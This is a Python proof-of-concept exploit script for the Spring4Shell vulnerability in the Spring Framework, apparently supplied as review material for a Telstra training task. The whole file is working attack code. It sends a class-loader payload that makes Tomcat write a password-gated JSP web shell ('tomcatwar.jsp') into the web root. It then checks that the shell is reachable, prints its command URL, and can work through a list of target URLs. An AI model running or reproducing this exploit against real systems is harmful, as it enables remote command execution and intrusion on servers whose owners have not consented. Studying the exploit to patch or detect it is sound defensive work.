"""
Proof of Concept File: Exploit Script for Spring4Shell Malware Attack

This script demonstrates the exploitation of a vulnerability in the Spring Framework, known as Spring4Shell.
The purpose of this script is to execute arbitrary commands on a target system.

Provided by Telstra to review Proof of Concept (POC) prior to developing Task 3.

Usage:
    - Run the script with the target URL to exploit the vulnerability.
    - Alternatively, provide a file containing multiple target URLs to exploit.

Dependencies:
    - Python 3
    - requests library

"""

import requests
import argparse
from urllib.parse import urljoin

def Exploit(url):
    # Headers with malicious payload
    headers = {
        "suffix": "%>//",
        "c1": "Runtime",
        "c2": "<%",
        "DNT": "1",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    # Payload data
    data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="

    try:
        # Send a POST request with the malicious payload
        go = requests.post(url, headers=headers, data=data, timeout=15, allow_redirects=False, verify=False)
        
        # Check if the shell is successfully created
        shellurl = urljoin(url, 'tomcatwar.jsp')
        shellgo = requests.get(shellurl, timeout=15, allow_redirects=False, verify=False)
        if shellgo.status_code == 200:
            print(f"漏洞存在，shell地址为: {shellurl}?pwd=j&cmd=whoami")
    except Exception as e:
        print(e)
        pass

def main():
    parser = argparse.ArgumentParser(description='Spring4Shell Exploit Script')
    parser.add_argument('--file', help='URL file', required=False)
    parser.add_argument('--url', help='Target URL', required=False)
    args = parser.parse_args()
    
    if args.url:
        # Exploit the vulnerability on the provided target URL
        Exploit(args.url)
    
    if args.file:
        with open(args.file) as f:
            for i in f.readlines():
                i = i.strip()
                # Exploit the vulnerability on each target URL in the file
                Exploit(i)

if __name__ == '__main__':
    main()
